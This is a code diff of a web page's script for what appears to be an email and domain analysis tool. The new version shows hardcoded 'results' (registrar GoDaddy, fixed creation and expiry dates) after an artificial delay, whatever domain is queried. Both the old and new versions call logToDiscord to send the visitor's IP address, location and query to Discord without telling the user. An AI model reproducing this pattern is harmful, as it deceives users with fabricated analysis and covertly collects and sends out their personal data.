-                                            ${emailData.reputation.spam ? 'High' : 'Low'}
-                                        </span>
-                                    </td>
-                                </tr>
-                            </table>
-                        </div>
-                    </div>
-                </div>
+    setTimeout(() => {
+        const resultHTML = `
+            <div class="card p-3">
+                <h4><i class="fas fa-search-location me-2"></i>Domain Analysis: ${domain}</h4>
+                <table class="data-table mt-3">
+                    <tr>
+                        <th>Domain</th>
+                        <td>${domain}</td>
+                    </tr>
+                    <tr>
+                        <th>Registrar</th>
+                        <td>GoDaddy</td>
+                    </tr>
+                    <tr>
+                        <th>Created</th>
+                        <td>2020-01-15</td>
+                    </tr>
+                    <tr>
+                        <th>Expires</th>
+                        <td>2025-01-15</td>
+                    </tr>
+                    <tr>
+                        <th>Nameservers</th>
+                        <td>ns1.example.com, ns2.example.com</td>
+                    </tr>
+                </table>
             </div>
-            
-            ${emailData.breaches > 0 ? `
-            <div class="card mt-4">
-                <div class="card-body">
-                    <h5><i class="fas fa-exclamation-triangle me-2 text-danger"></i>Breach Details</h5>
-                    <div class="alert alert-danger mt-3">
-                        <i class="fas fa-exclamation-circle me-2"></i>
-                        This email appears in ${emailData.breaches} known data breaches
-                    </div>
-                    
-                    <div class="breach-card mt-3">
-                        <div class="breach-header">
-                            <i class="fas fa-database me-2"></i>
-                            <h5 class="breach-title mb-0">LinkedIn 2021 Breach</h5>
-                            <span class="badge bg-danger ms-2">High</span>
-                        </div>
-                        <div class="p-3">
-                            <div class="row">
-                                <div class="col-md-6">
-                                    <p><strong>Date:</strong> June 2021</p>
-                                    <p><strong>Compromised Data:</strong> Emails, Passwords</p>
-                                </div>
-                                <div class="col-md-6">
-                                    <p><strong>Records:</strong> 700 million</p>
-                                    <p><strong>Risk:</strong> Critical</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            ` : ''}
-            
-            <div class="card mt-4">
-                <div class="card-body">
-                    <h5><i class="fas fa-share-alt me-2"></i>Social Presence</h5>
-                    <div class="row mt-3">
-                        <div class="col-md-4">
-                            <div class="d-flex align-items-center">
-                                <i class="fab fa-twitter me-2"></i>
-                                <span>Twitter: </span>
-                                <span class="badge ${emailData.social.twitter === 'found' ? 'bg-success' : 'bg-secondary'} ms-2">
-                                    ${emailData.social.twitter}
-                                </span>
-                            </div>
-                        </div>
-                        <div class="col-md-4">
-                            <div class="d-flex align-items-center">
-                                <i class="fab fa-facebook me-2"></i>
-                                <span>Facebook: </span>
-                                <span class="badge bg-secondary ms-2">
-                                    ${emailData.social.facebook}
-                                </span>
-                            </div>
-                        </div>
-                        <div class="col-md-4">
-                            <div class="d-flex align-items-center">
-                                <i class="fab fa-linkedin me-2"></i>
-                                <span>LinkedIn: </span>
-                                <span class="badge ${emailData.social.linkedin === 'found' ? 'bg-success' : 'bg-secondary'} ms-2">
-                                    ${emailData.social.linkedin}
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    `;
-    
-    resultsDiv.innerHTML = resultHTML;
-    
-    // Log to Discord
-    logToDiscord(
-        "Email Analysis", 
-        `**Analyzed email:** ${email}`,
-        [
-            { name: "Domain", value: domain },
-            { name: "Disposable", value: emailData.disposable ? "Yes" : "No" },
-            { name: "Breaches", value: emailData.breaches.toString() },
-            { name: "Reputation", value: `${emailData.reputation.score}/100` },
-            { name: "Visitor IP", value: visitorIP },
-            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
-        ]
-    );
+        `;
+        
+        resultsDiv.innerHTML = resultHTML;
+        
+        // Log to Discord
+        logToDiscord(
+            "Domain Analysis", 
+            `User analyzed domain`,
+            [
+                { name: "Domain", value: domain },
+                { name: "Visitor IP", value: visitorData.ip },
+                { name: "Visitor Location", value: visitorData.location || "Unknown" }
+            ]
+        );
+    }, 1500);
 }
 </script>
 </body>
